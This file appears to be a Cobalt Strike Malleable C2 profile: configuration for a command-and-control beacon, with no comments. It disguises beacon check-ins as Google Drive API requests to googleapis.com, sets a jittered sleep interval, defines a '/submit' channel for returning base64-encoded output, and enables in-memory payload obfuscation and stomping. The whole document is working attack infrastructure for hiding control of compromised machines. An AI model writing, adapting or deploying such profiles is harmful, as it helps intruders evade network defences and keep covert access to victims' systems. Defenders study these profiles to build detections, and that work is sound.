set useragent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)";
set sleeptime 90000;
set jitter 5;

set metadata {
    netbios;
    base64;
}

http-get {
  set uri "/drive/v3/files/lo9ve2";

  client {
    header "Host" "www.googleapis.com";
    header "Accept" "*/*";
    header "Referer" "https://www.googleapis.com/";
    metadata {
      base64;
    }
  }

  server {
    header "Content-Type" "application/octet-stream";
    output "base64";
  }
}

http-post {
  set uri "/submit";

  client {
    id {
      base64;
    }

    output {
      base64;
    }
  }

  server {
    header "Content-Type" "application/json";
    output "base64";
  }
}

stage {
    set stomppe "true";
    set smartinject "true";
    set userwx "false";
    set compile_time "4";
    set obfuscate "true";
}
